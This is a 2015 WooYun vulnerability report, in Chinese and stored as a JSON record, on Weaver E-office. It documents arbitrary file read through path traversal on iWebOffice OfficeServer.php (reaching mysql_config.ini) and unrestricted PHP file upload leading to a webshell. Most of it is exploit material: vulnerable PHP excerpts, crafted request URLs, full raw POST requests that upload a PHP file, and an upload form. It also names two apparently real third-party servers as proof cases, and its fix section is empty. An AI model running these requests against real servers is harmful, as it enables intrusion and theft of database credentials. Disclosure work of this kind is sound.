{"id": 65807, "wybug_id": "wooyun-2015-0125638", "wybug_title": "泛微Eoffice 某2个文件多处任意文件读取/多处任意文件上传可直接getshell", "wybug_corp": "泛微E-office", "wybug_author": "Bear baby", "wybug_date": "2015-07-11 16:31", "wybug_open_date": "2015-10-11 14:52", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向公众公开  简要描述： 第二发来临。。老师在给我们放电影。。赶紧发完，嘻嘻。 详细说明：    某2个文件多处任意文件读取文件位置：\n/iWebOffice/OfficeServer.php/iWebOffice/OfficeServer2.php\n这两个文件是IwebOffice控件的一个操作文件，经对比代码完全一样。估计又是copy出来的。代码比较长，只贴相关代码1.第一处读取任意文件。相关代码如下\n$mOption = $OPTION;switch ( $mOption ){case \"LOADFILE\" :\t\t\t\t$mRecordID = $RECORDID;\t\t\t\t$mUserName = $USERNAME;\t\t\t\t$mFileName = $_REQUEST['FILENAME'];\t\t\t\t$mFileType = $FILETYPE;\t\t\t\t$mFullPath = $mFilePath.\"/\".$mFileName;\t\t\t\t$result = $MsgObj->MsgFileLoad( $mFullPath );\t\t\t\tif ( !$result )\t\t\t\t{\t\t\t\t\t\t\t\t$MsgObj->MsgError( $_lang['file_file_not_exist'].$mFullPath );\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\t$MsgObj->SetMsgByName( \"STATUS\", $_lang['file_open_success'].\"!\" );\t\t\t\t}\t\t\t\tbreak;\n通过$OPTION进入LOADFILE流程。$mFileName = $_REQUEST['FILENAME'];文件名通过REQUEST提交，且控件$MsgObj->MsgFileLoad( $mFullPath )读取文件没有进行判断。所以造成可读取任意文件。默认读取目录为/attachment/所以我们构造访问地址如iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini如下图\n\n第二处任意文件读取，相关代码如下：\ncase \"LOADTEMPLATE\" :\t\t\t\t$mTemplate = $TEMPLATE;\t\t\t\t$mFileType = $FILETYPE;\t\t\t\t$mCommand = $COMMAND;\t\t\t\tif ( $mCommand == \"INSERTFILE\" )\t\t\t\t{\t\t\t\t\t\t\t\t$MsgObj->MsgTextClear( );\t\t\t\t\t\t\t\t$result = $MsgObj->MsgFileLoad( $mFilePath.\"/\".$mTemplate );\t\t\t\t\t\t\t\tif ( !$result )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$MsgObj->MsgError( \"File not exists \".$mFilePath.\"/\".$mTemplate );\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$MsgObj->SetMsgByName( \"STATUS\", $_lang['file_open_success'].\"!\" );\t\t\t\t\t\t\t\t}\t\t\t\t}\n通过$OPTION进入的是LOADTEMPLATE流程。$mTemplate = $TEMPLATE;$mCommand = $COMMAND;TEMPLATE为要读取的文件名，当COMMAND为INSERTFILE时进入$MsgObj->MsgFileLoad( $mFilePath.\"/\".$mTemplate );同上没有进行验证过滤等操作，造成任意文件读取。默认读取目录为/attachment/所以我们构造访问地址如iweboffice/officeserver.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../mysql_config.ini如下图\n\n第三处\ncase \"GETFILE\" :\t\t\t\t$mRecordID = $RECORDID;\t\t\t\t$mLocalFile = $LOCALFILE;\t\t\t\t$mRemoteFile = $REMOTEFILE;\t\t\t\t$mFilePath = $mFilePath.\"/\".$mRemoteFile;\t\t\t\t$MsgObj->MsgTextClear( );\t\t\t\tif ( $MsgObj->MsgFileLoad( $mFilePath ) )\t\t\t\t{\t\t\t\t\t\t\t\t$MsgObj->SetMsgByName( \"STATUS\", $_lang['file_save_fail'].\"!\" );\t\t\t\t\t\t\t\t$MsgObj->MsgError( \"\" );\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\t$MsgObj->MsgError( $_lang['file_save_fail'].\"!\" );\t\t\t\t}\t\t\t\tbreak;\n同样的问题，不再详细分析。构造地址/iweboffice/officeserver.php?OPTION=GETFILE&REMOTEFILE=../mysql_config.ini如下图\n\n二。某文件多处任意文件上传，可直接getshell第一处，相关代码如下\ncase \"SAVEFILE\" :\t\t\t\t$mRecordID = $RECORDID;\t\t\t\t$mUserName = $USERNAME;\t\t\t\t$mFileName = $FILENAME;\t\t\t\t$mFileType = $FILETYPE;\t\t\t\t$mDescript = $DESCRIPT;\t\t\t\t$mFileDate = $FileDate;\t\t\t\t$mFullPath = $mFilePath.\"/\".$mFileName;\t\t\t\tif ( is_uploaded_file( $_FILES['MsgFileBody']['tmp_name'] ) )\t\t\t\t{\t\t\t\t\t\t\t\tif ( move_uploaded_file( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$mFileSize = $_FILES['MsgFileBody']['size'];\t\t\t\t\t\t\t\t\t\t\t\t$result = true;\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$MsgObj->MsgError( \"Save File Error\" );\t\t\t\t\t\t\t\t\t\t\t\t$result = false;\t\t\t\t\t\t\t\t}\t\t\t\t}\n表单可以自行构造一下。OPTION为SAVEFILE，FILENAME是保存的文件名可以自己命名。Fiddler抓包如下\nPOST http://192.168.1.129:8082/iweboffice/officeserver.php?OPTION=SAVEFILE&FILENAME=abc.php HTTP/1.1Host: 192.168.1.129:8082User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: USER_NAME_COOKIE=admin; LOGIN_LANG=cnConnection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------10267625012906Content-Length: 215-----------------------------10267625012906Content-Disposition: form-data; name=\"MsgFileBody\"; filename=\"1.php\"Content-Type: application/php<?php phpinfo();?>-----------------------------10267625012906--\n如下图。\n\n第二处 相关代码如下\ncase \"SAVETEMPLATE\" :\t\t\t\t$mRecordID = $TEMPLATE;\t\t\t\t$mFileName = $FILENAME;\t\t\t\t$mFileType = $FILETYPE;\t\t\t\t$mFullPath = $mFilePath.\"/\".$mRecordID.$mFileType;\t\t\t\t$mDescript = $DESCRIPT;\t\t\t\t$mFileDate = $FileDate;\t\t\t\t$mUserName = $UserName;\t\t\t\tif ( is_uploaded_file( $_FILES['MsgFileBody']['tmp_name'] ) )\t\t\t\t{\t\t\t\t\t\t\t\tif ( move_uploaded_file( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$mFileSize = $_FILES['MsgFileBody']['size'];\t\t\t\t\t\t\t\t\t\t\t\t$result = true;\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$MsgObj->MsgError( \"Save File Error\" );\t\t\t\t\t\t\t\t\t\t\t\t$result = false;\t\t\t\t\t\t\t\t}\t\t\t\t}\nOPTION为SAVETEMPLATE，TEMPLATE是文件名可以自己命名。Fiddler抓包如下\nPOST http://192.168.1.129:8082/iweboffice/officeserver.php?OPTION=SAVETEMPLATE&TEMPLATE=cba.php HTTP/1.1Host: 192.168.1.129:8082User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: USER_NAME_COOKIE=admin; LOGIN_LANG=cnConnection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------10267625012906Content-Length: 215-----------------------------10267625012906Content-Disposition: form-data; name=\"MsgFileBody\"; filename=\"1.php\"Content-Type: application/php<?php phpinfo();?>-----------------------------10267625012906--\n\n\n那串STATUS是base64编码，内容为文件的物理路径如下图\n\n以下还有4处，基本思路和上面的完全一样，构造参数不一样而已，不再详细叙述过程，只贴相关代码，可自行测试。第三处\ncase \"SAVEASHTML\" :\t\t\t\t$mFileName = $HTMLNAME;\t\t\t\t$mDirectory = $DIRECTORY;\t\t\t\t$MsgObj->MsgTextClear;\t\t\t\tif ( trim( $mDirectory ) == \"\" )\t\t\t\t{\t\t\t\t\t\t\t\t$mFullPath = $_SERVER['DOCUMENT_ROOT'].\"/iWebOffice/HTML/\".$mFileName;\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\t$mFullPath = $_SERVER['DOCUMENT_ROOT'].\"/iWebOffice/HTML/\".$mDirectory.\"/\".$mFileName;\t\t\t\t\t\t\t\t$MsgObj->MakeDirectory( $_SERVER['DOCUMENT_ROOT'].\"/iWebOffice/HTML/\".$mDirectory );\t\t\t\t}\t\t\t\tif ( is_uploaded_file( $_FILES['MsgFileBody']['tmp_name'] ) )\t\t\t\t{\t\t\t\t\t\t\t\tif ( move_uploaded_file( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$mFileSize = $_FILES['MsgFileBody']['size'];\t\t\t\t\t\t\t\t\t\t\t\t$result = true;\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$MsgObj->MsgError( \"Save File Error\" );\t\t\t\t\t\t\t\t\t\t\t\t$result = false;\t\t\t\t\t\t\t\t}\t\t\t\t}\n第四处\ncase \"SAVEIMAGE\" :\t\t\t\t$mFileName = $HTMLNAME;\t\t\t\t$mDirectory = $DIRECTORY;\t\t\t\t$MsgObj->MsgTextClear;\t\t\t\tif ( trim( $mDirectory ) == \"\" )\t\t\t\t{\t\t\t\t\t\t\t\t$mFullPath = $_SERVER['DOCUMENT_ROOT'].\"/iWebOffice/HTMLIMAGE/\".$mFileName;\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\t$mFullPath = $_SERVER['DOCUMENT_ROOT'].\"/iWebOffice/HTMLIMAGE/\".$mDirectory.\"/\".$mFileName;\t\t\t\t\t\t\t\t$MsgObj->MakeDirectory( $_SERVER['DOCUMENT_ROOT'].\"/iWebOffice/HTMLIMAGE/\".$mDirectory );\t\t\t\t}\t\t\t\tif ( is_uploaded_file( $_FILES['MsgFileBody']['tmp_name'] ) )\t\t\t\t{\t\t\t\t\t\t\t\tif ( move_uploaded_file( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$mFileSize = $_FILES['MsgFileBody']['size'];\t\t\t\t\t\t\t\t\t\t\t\t$result = true;\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$MsgObj->MsgError( \"Save File Error\" );\t\t\t\t\t\t\t\t\t\t\t\t$result = false;\t\t\t\t\t\t\t\t}\t\t\t\t}\n第五处\ncase \"UPDATEFILE\" :\t\t\t\t$mRecordID = $RECORDID;\t\t\t\t$mFileName = $FILENAME;\t\t\t\t$mFileType = $FILETYPE;\t\t\t\t$mFileDate = date( \"Y-m-d H:i:s\" );\t\t\t\t$mUserName = $mUserName;\t\t\t\t$mDescript = \"定稿版本\";\t\t\t\t$MsgObj->MsgTextClear;\t\t\t\tif ( is_uploaded_file( $_FILES['MsgFileBody']['tmp_name'] ) )\t\t\t\t{\t\t\t\t\t\t\t\tif ( move_uploaded_file( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$mFileSize = $_FILES['MsgFileBody']['size'];\t\t\t\t\t\t\t\t\t\t\t\t$result = true;\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$MsgObj->MsgError( \"Save File Error\" );\t\t\t\t\t\t\t\t\t\t\t\t$result = false;\t\t\t\t\t\t\t\t}\t\t\t\t}\n第六处\ncase \"PUTFILE\" :\t\t\t\t$mRecordID = $RECORDID;\t\t\t\t$mLocalFile = $LOCALFILE;\t\t\t\t$mRemoteFile = $REMOTEFILE;\t\t\t\t$mFilePath = $mFilePath.\"/\".$mRemoteFile;\t\t\t\t$MsgObj->MsgTextClear( );\t\t\t\tif ( is_uploaded_file( $_FILES['MsgFileBody']['tmp_name'] ) )\t\t\t\t{\t\t\t\t\t\t\t\tif ( move_uploaded_file( $_FILES['MsgFileBody']['tmp_name'], $mFilePath ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$mFileSize = $_FILES['MsgFileBody']['size'];\t\t\t\t\t\t\t\t\t\t\t\t$result = true;\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t$MsgObj->MsgError( \"Save File Error\" );\t\t\t\t\t\t\t\t\t\t\t\t$result = false;\t\t\t\t\t\t\t\t}\t\t\t\t}\n文件位置：/webservice/upload/upload.php/webservice-json/upload/upload.php/webservice-xml/upload/upload.php这三处文件经过对比内容完全一样，估计程序猿童鞋直接copy一下就使用。相关代码如下：\n<?phpinclude_once( \"inc/utility_all.php\" );$pathInfor = pathinfo( $_FILES['file']['tmp_name'] );$extension = $pathInfor['extension'];$role = UPLOADROLE;$pos = $extension ? strpos( $role, strtoupper( $extension ) ) : false;if ( !( $pos === false ) ){\t\t\t\techo \"false\";}else{\t\t\t\t$attachmentID = createfiledir( );\t\t\t\tglobal $ATTACH_PATH;\t\t\t\t$path = $ATTACH_PATH.$attachmentID;\t\t\t\tif ( !file_exists( $path ) )\t\t\t\t{\t\t\t\t\t\t\t\tmkdir( $path, 448 );\t\t\t\t}\t\t\t\t$attachmentName = $_FILES['file']['tmp_name'];\t\t\t\t$fileName = $path.\"/\".$_FILES['file']['name'];\t\t\t\t$fileName = iconv( \"UTF-8\", \"GBK\", $fileName );\t\t\t\tmove_uploaded_file( $_FILES['file']['tmp_name'], $fileName );\t\t\t\tif ( !file_exists( $fileName ) )\t\t\t\t{\t\t\t\t\t\t\t\techo \"false\";\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\techo $attachmentID.\"*\".$_FILES['file']['name'];\t\t\t\t}}?>\n依然没有任何过滤，保存路径如下\n$path = $ATTACH_PATH.$attachmentID;$fileName = $path.\"/\".$_FILES['file']['name'];move_uploaded_file( $_FILES['file']['tmp_name'], $fileName );\n构造个上传表单如下：\n<form action=\"http://网站地址/ webservice/upload/upload.php\" form enctype=\"multipart/form-data\"  method=\"POST\"><input name=\"file\" type=\"file\"><input name=\"\" type=\"submit\"></form>\n对应Fiddler抓包\nPOST http://192.168.1.129:8082/webservice/upload/upload.php HTTP/1.1Host: 192.168.1.129:8082User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: USER_NAME_COOKIE=admin; LOGIN_LANG=cnConnection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------10267625012906Content-Length: 208-----------------------------10267625012906Content-Disposition: form-data; name=\"file\"; filename=\"1.php\"Content-Type: application/php<?php phpinfo();?>-----------------------------10267625012906--\n如下图:返回目录名和文件名，对应路径即/attachment/3704096226/1.php\n\n   漏洞证明：  http://122.224.149.30:8082 //案例还是从别人那找的，嘻嘻\n\nhttp://61.163.107.26:8082\n\n   修复方案：     版权声明：转载请注明来源 Bear baby@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-07-13 14:50 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-09 16:36 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  总结一下，我也去来一发    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}